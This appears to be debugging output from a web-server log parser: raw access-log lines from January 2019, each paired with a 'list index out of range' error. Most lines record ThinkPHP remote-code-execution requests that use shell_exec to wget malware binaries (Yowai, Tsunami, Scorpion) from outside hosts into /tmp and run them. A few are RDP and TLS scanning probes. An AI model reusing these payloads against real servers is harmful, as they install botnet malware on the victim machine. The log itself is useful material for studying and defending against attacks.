('74.82.60.85 - - [23/Jan/2019:12:47:00 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\xDC\\xCBJ}\\xA6\\x8A" 400 166 "-" "-" "-"\n', 'list index out of range')
('42.118.241.13 - - [23/Jan/2019:13:18:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('37.29.32.137 - - [23/Jan/2019:13:18:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('117.198.103.116 - - [23/Jan/2019:13:25:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:13:27:55 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('58.216.145.214 - - [23/Jan/2019:14:07:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('88.71.38.235 - - [23/Jan/2019:14:10:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('153.145.147.89 - - [23/Jan/2019:14:30:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.99.114.34 - - [23/Jan/2019:14:31:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [23/Jan/2019:15:08:09 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.163.179.129 - - [23/Jan/2019:15:10:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:15:25:25 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:25538},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[51990]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[52655,%2052656,%2052657,%2052658,%2052659,%2052660,%2052661,%2052662,%2052663,%2052665]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[544830,%20546600,%20550351,%20553443,%20560398,%20562693,%20562711,%20563201,%20563612,%20596195,%20616862,%20619229,%20658829,%20710492,%20711098,%20828002,%20992279,%201035525,%201049985,%201077057,%201093845,%201120584,%201133461,%201167502,%201199142,%201243639,%201252993,%201260212,%201268963,%201271146,%201275637,%201285275,%201290628,%201302637,%201314616,%201325630,%201338198,%201353457,%201377565,%201384634,%201397936,%201399349,%201405002,%201419008,%201431512,%201446966,%201475130,%201490551,%201521345,%201539907,%201616908,%201629906,%201665472,%201731786,%201754922,%20544831,%20546601,%20550352,%20553444,%20560399,%20562695,%20562713,%20563202,%20563613,%20596196,%20616863,%20619230,%20658830,%20710493,%20711099,%20828003,%20992280,%201035526,%201049986,%201077058,%201093846,%201120585,%201133462,%201167503,%201199143,%201243640,%201252994,%201260213,%201268964,%201271147,%201275638,%201285276,%201290629,%201302638,%201314617,%201325631,%201338199,%201353458,%201377567,%201384636,%201397938,%201399351,%201405004,%201419010,%201431514,%201446968,%201475132,%201490553,%201521347,%201539909,%201616910,%201629908,%201665474,%201731788,%201754924,%20544832,%20546602,%20550353,%20553445,%20560400,%20562697,%20562715,%20563203,%20563614,%20596197,%20616864,%20619231,%20658831,%20710494,%20711100,%20828004,%20992281,%201035527,%201049987,%201077059,%201093847,%201120586,%201133463,%201167504,%201199144,%201243641,%201252995,%201260214,%201268965,%201271148,%201275639,%201285277,%201290630,%201302639,%201314618,%201325632,%201338200,%201353459,%201377569,%201384638,%201397940,%201399353,%201405006,%201419012,%201431516,%201446970,%201475134,%201490555,%201521349,%201539911,%201616912,%201629910,%201665476,%201731790,%201754926,%20544833,%20546603,%20550354,%20553446,%20560401,%20562699,%20562717,%20563204,%20563615,%20596198,%20619232,%20658832,%20710495,%20711101,%20828005,%20992282,%201035528,%201049988,%201077060,%201093848,%201120587,%201133464,%201167505,%201199145,%201243642,%201252996,%201260215,%201268966,%201271149,%201275640,%201285278,%201290631,%201302640,%201314619,%201325633,%201338201,%201353460,%201377571,%201384640,%201397942,%201399355,%201405008,%201419014,%201431518,%201446972,%201475136,%201490557,%201521351,%201539913,%201616914,%201629912,%201665478,%201731792,%201754928,%20544834,%20546604,%20550355,%20553447,%20560402,%20562701,%20562719,%20563205,%20563616,%20596199,%20616865,%20619233,%20658833,%20710496,%20711102,%20828006,%20992283,%201035529,%201049994,%201077061,%201093849,%201120588,%201133465,%201167506,%201199146,%201243643,%201252997,%201260216,%201268967,%201271150,%201275641,%201285279,%201290632,%201302641,%201314620,%201325634,%201338202,%201353461,%201377573,%201384642,%201397944,%201399357,%201405010,%201419016,%201431520,%201446974,%201475138,%201490559,%201521353,%201539915,%201616916,%201629914,%201665480,%201731794,%201754930,%20544835,%20546605,%20550356,%20553448,%20560403,%20562703,%20562721,%20563206,%20563617,%20596200,%20616866,%20619234,%20658834,%20710497,%20711103,%20828007,%20992284,%201035530,%201049993,%201077062,%201093850,%201120589,%201133466,%201167507,%201199147,%201243644,%201252998,%201260217,%201268968,%201271151,%201275642,%201285280,%201290633,%201302642,%201314621,%201325635,%201338203,%201353462,%201377575,%201384644,%201397946,%201399359,%201405012,%201419018,%201431522,%201446976,%201475140,%201490561,%201521355,%201539917,%201616918,%201629916,%201665482,%201731796,%201754932,%20544836,%20546606,%20550357,%20553449,%20560404,%20562704,%20562723,%20563207,%20563618,%20596201,%20616867,%20619235,%20658835,%20710498,%20711104,%20828008,%20992285,%201035531,%201049992,%201077063,%201093851,%201120590,%201133467,%201167508,%201199148,%201243645,%201252999,%201260218,%201268969,%201271152,%201275643,%201285281,%201290634,%201302643,%201314622,%201325636,%201338204,%201353463,%201377577,%201384646,%201397948,%201399361,%201405014,%201419020,%201431524,%201446978,%201475142,%201490563,%201521357,%201539919,%201616920,%201629918,%201665484,%201731798,%201754934,%20544837,%20546607,%20550358,%20553450,%20560405,%20562706,%20562724,%20563208,%20563619,%20596202,%20616868,%20619236,%20658836,%20710499,%20711105,%20828009,%20992286,%201035532,%201049991,%201077064,%201093852,%201120591,%201133468,%201167509,%201199149,%201243646,%201253000,%201260219,%201268970,%201271153,%201275644,%201285282,%201290635,%201302644,%201314623,%201325637,%201338205,%201353464,%201377579,%201384648,%201397950,%201399363,%201405016,%201419022,%201431526,%201446980,%201475144,%201490565,%201521359,%201539921,%201616922,%201629920,%201665486,%201731800,%201754936,%20544838,%20546608,%20550359,%20553451,%20560406,%20562708,%20562726,%20563209,%20563620,%20596203,%20616869,%20619237,%20658837,%20710500,%20711106,%20828010,%20992287,%201035533,%201049990,%201077065,%201093853,%201120592,%201133469,%201167510,%201199150,%201243647,%201253001,%201260220,%201268971,%201271154,%201275645,%201285283,%201290636,%201302645,%201314624,%201325638,%201338206,%201353465,%201377581,%201384650,%201397952,%201399365,%201405018,%201419024,%201431528,%201446982,%201475146,%201490567,%201521361,%201539923,%201616924,%201629922,%201665488,%201731802,%201754938,%20544839,%20546609,%20550360,%20553452,%20560407,%20562710,%20562728,%20563210,%20563621,%20596204,%20616870,%" 414 186 "-" "-" "-"\n', 'list index out of range')
('193.250.60.181 - - [23/Jan/2019:15:48:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('219.145.246.35 - - [23/Jan/2019:16:11:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('37.29.35.152 - - [23/Jan/2019:16:46:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('112.137.114.117 - - [23/Jan/2019:17:03:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('124.140.76.80 - - [23/Jan/2019:17:04:32 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('221.125.253.128 - - [23/Jan/2019:17:30:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.227.227 - - [23/Jan/2019:18:01:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('122.196.231.141 - - [23/Jan/2019:18:12:30 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('66.160.178.90 - - [23/Jan/2019:19:06:38 +0330] "w\\x12\\xC4\\xD1\\x83\\x07\\x84\\x14dJ4\\x8D\\xDBym\\xADY\\xD3\\x85\\x13\\xB1tx\\xFD\\xC4\\x0F=\\xBD\'xA\\x91b\\x8A\\xAB\\x12\\xC1lta\\x7Ft%\\xB9\\xC8\\xDF\\xCA\\xA7\\xEE\\x80\\xFE\\x0Cc\\x0F\\x8Ey!\\x9F\\x09\\xC9\\x1A\\x92\\xD1\\xDF\\xDC\\xE8>\\x16wf\'\\xA6" 400 166 "-" "-" "-"\n', 'list index out of range')
('49.241.214.70 - - [23/Jan/2019:19:07:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.162.242.70 - - [23/Jan/2019:19:07:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('178.46.9.201 - - [23/Jan/2019:19:17:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('99.100.6.45 - - [23/Jan/2019:19:24:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('117.192.231.96 - - [23/Jan/2019:19:31:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('41.235.182.3 - - [23/Jan/2019:20:15:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('41.235.182.3 - - [23/Jan/2019:20:15:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('121.84.86.234 - - [23/Jan/2019:20:22:42 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('116.65.89.179 - - [23/Jan/2019:20:31:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('193.250.60.181 - - [23/Jan/2019:20:37:55 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('188.18.193.169 - - [23/Jan/2019:20:49:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.222.211.18 - - [23/Jan/2019:21:01:08 +0330] "\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.50.236.10 - - [23/Jan/2019:21:25:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:21:26:22 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:21:26:23 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.125.79 - - [23/Jan/2019:21:31:31 +0330] "nKB*=w\\xF4\\x0C\\xB5\\x189\\x9D\\xB0<K\\x9B\\xBA\\x82\\x0EP\\xFDp\\x060?\\xCA\\x93\\xA2\\xDF\\xA7D\\x06\\xED\\x1C\\x9Eb\\xC7G\\xCBYq\\x10\\x02\\xAC\\x1C\\xEE\\xDA1Ot\\xA5\\xF0b$\\x05\\xE1\\xFA\\xB7\\xA8\\xB9 5\\xBB0\\xD3}!\\xDD<\\x99\\xD7\\x1C\\xD5\\x04\\x03\\xF2\\x80)\\x99\\x80\\xD8\\x0B\\xF0\\x93\\x95\\x8D\\x0B\\xD2\\x06\\x9E\\xFC\\x19j\\xB3\\x8F\\x0B\\x99\\xDA\\x15\\xB2g\\xE07Z\\x9F\\x9E\\xE0\\x8B\\xD8\\x9CT_a\\xCA\\xDD\\xD4\\x13\\x9F\\xE1\\xDE\\x98\\xA1\\x88K>\\x7F\\x17!_.\\xDA\\xE4\\x0F\\x15+<7\\x03\\x04c#\\xF0\\xF3$\\x8ENa\\x09\\xC9\\x1F7B\\x12\\xE5\\xDF\\xDC\\xB64\\x1D\\xE7\\xBE\\xAD\\xDF8\\xFA\\x92\\xE7\\xE9\\x16\\xA3\\xA0\\xC9\\x98b\\x9B\\x07\\xFB\\x98G\\xD8\\x8D`\\x16\\xDDU\\xBE\\x8E\\x86\\xE9\\x96\\xE8\\xD6\\x1E\\xE2v\\x1C\\xF1\\x1Fy" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.23.156.20 - - [23/Jan/2019:21:37:36 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('47.39.229.74 - - [23/Jan/2019:21:38:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [23/Jan/2019:21:45:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.105.7.73 - - [23/Jan/2019:22:00:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('144.132.10.218 - - [23/Jan/2019:22:04:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.62.197.31 - - [23/Jan/2019:22:43:20 +0330] "\\x00;\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03\\xC3/\\xFF\\x83\\xD4o\\x8EA\\xA2\\x91w\\xEC\\x94\\xFDV\\xF9\\xBCm\\xDDm\\xF5\\xD5\\x04\\x9D\\x94\\x9A\\xA4\\x8A\\x05]\\x0C\\xEF \\xCD\\xE1\\x92\\xBD\\x86J\\x92[\\x89" 400 166 "-" "-" "-"\n', 'list index out of range')
('94.51.18.239 - - [23/Jan/2019:23:30:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('60.62.222.177 - - [23/Jan/2019:23:45:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('190.98.36.106 - - [23/Jan/2019:23:49:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('49.241.214.70 - - [23/Jan/2019:23:50:59 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('120.75.116.136 - - [24/Jan/2019:00:26:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4" 400 166 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4" 400 166 "-" "-" "-"\n', 'list index out of range')
('103.36.79.7 - - [24/Jan/2019:01:53:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
